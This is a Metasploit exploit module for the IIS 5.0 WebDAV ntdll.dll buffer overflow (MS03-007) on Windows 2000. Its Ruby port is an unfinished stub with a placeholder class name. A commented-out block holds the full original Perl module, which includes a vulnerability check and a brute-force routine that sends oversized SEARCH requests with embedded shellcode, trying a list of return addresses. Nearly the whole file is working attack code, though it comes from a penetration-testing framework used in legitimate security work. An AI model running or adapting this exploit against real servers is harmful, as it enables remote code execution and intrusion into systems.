require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'IIS 5.0 WebDAV ntdll.dll Overflow',
			'Description'    => %q{
				This exploits a buffer overflow in NTDLL.dll on Windows 2000
				through the SEARCH WebDAV method in IIS. This particular
				module only works against Windows 2000. It should have a
				reasonable chance of success against any service pack.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '4467'],
					[ 'MSB', 'MS03-007'],
					[ 'CVE', '2003-0109'],
					[ 'MIL', '28'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'May 30 2003',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::iis50_webdav_ntdll;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'    => 'IIS 5.0 WebDAV ntdll.dll Overflow',
	'Version' => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000' ],
	'Priv'  => 0,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'  => 512,
		'BadChars'  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This exploits a buffer overflow in NTDLL.dll on Windows 2000
        through the SEARCH WebDAV method in IIS. This particular
        module only works against Windows 2000. It should have a
        reasonable chance of success against any service pack.    
}),

	'Refs'  =>
	  [
		['OSVDB', '4467'],
		['MSB', 'MS03-007'],
		['CVE', '2003-0109'],
		['MIL', '28'],
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
		['Windows 2000 Bruteforce']
	  ],

	'Keys' => ['iis'],

	'DisclosureDate' => 'May 30 2003',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	my $request;
	my $content;

	my $url = "x" x 65535;

	$request  = "SEARCH /" . $url ." HTTP/1.1\r\n";
	$request .= "Host: " . $target_host . ":" . $target_port . "\r\n";
	$request .= "Content-Type: text/xml\r\n";

	$content .= "<?xml version=\"1.0\"?>\r\n<g:searchrequest xmlns:g=\"DAV:\">\r\n";
	$content .= "<g:sql>\r\nSelect \"DAV:displayname\" from scope()\r\n</g:sql>\r\n</g:searchrequest>\r\n";

	$request .= "Content-Length: " . length($content) . "\r\n";
	$request .= "\r\n$content";

	$s->Send($request);
	my $res = $s->Recv(-1, 5);
	$s->Close();

	if ($res =~ /Server Error\(exception/)
	{
		$self->PrintLine("[*] Server appears to be vulnerable");
		return $self->CheckCode('Appears');
	}

	$s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		return $self->CheckCode('Appears');
	}
	$s->Close();

	$self->PrintLine("[*] Server does not appear to be vulnerable");
	return $self->CheckCode('Safe');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $use_ssl     = $self->GetVar('SSL');
	my $shellcode   =$self->GetVar('EncodedPayload')->Payload;

	my @targets =
	  (

		# Almost Targetted :)
		"\x4f\x4e", # =SP3
		"\x41\x42", # ~SP0  ~SP2
		"\x41\x43", # ~SP1, ~SP2

		# Generic Bruteforce
		"\x41\xc1",
		"\x41\xc3",
		"\x41\xc9",
		"\x41\xca",
		"\x41\xcb",
		"\x41\xcc",
		"\x41\xcd",
		"\x41\xce",
		"\x41\xcf",
		"\x41\xd0",
	  );

	foreach my $ret (@targets)
	{
		my $url = ("A" x 65516);
		my $s = $self->PollWebServer();
		exit(0) if ! $s;

		$self->PrintLine(sprintf("[*] Trying return address 0x%.8x...",
				unpack("V", substr($ret,0,1) . "\x00".
					  substr($ret,1,1) . "\x00"
				  )
			  ));

		substr($url, length($url) - length($shellcode), length($shellcode), $shellcode);
		substr($url, 283, 2, $ret );

		my ($request, $content);

		$request  = "SEARCH /" . $url ." HTTP/1.1\r\n";
		$request .= "Host: " . $target_host . ":" . $target_port . "\r\n";
		$request .= "Content-Type: text/xml\r\n";

		$content .= "<?xml version=\"1.0\"?>\r\n<g:searchrequest xmlns:g=\"DAV:\">\r\n";
		$content .= "<g:sql>\r\nSelect \"DAV:displayname\" from scope()\r\n</g:sql>\r\n</g:searchrequest>\r\n";

		$request .= "Content-Length: " . length($content) . "\r\n";
		$request .= "\r\n$content";

		$self->PrintLine("[*] Sending request (" . length($request) . " bytes)");
		$self->PrintLine("");
		$s->Send($request);

		my $r = $s->Recv(-1, 5);
		sleep(2);
		$s->Close();
	}
	return;
}

sub PollWebServer {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	$self->Print("[*] Connecting to web server");
	for (1 .. 20)
	{
		$self->Print(".");
		my $s = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
			'LocalPort' => $self->GetVar('CPORT'),
			'SSL'       => $self->GetVar('SSL'),
		  );
		if (! $s->IsError) {
			$self->PrintLine(" OK");
			return($s);
		}

		sleep(2);
		$s->Close();
	}

	$self->PrintLine("");
	$self->PrintLine("[*] Giving up on the web server");
	return;
}


=end


end
end	
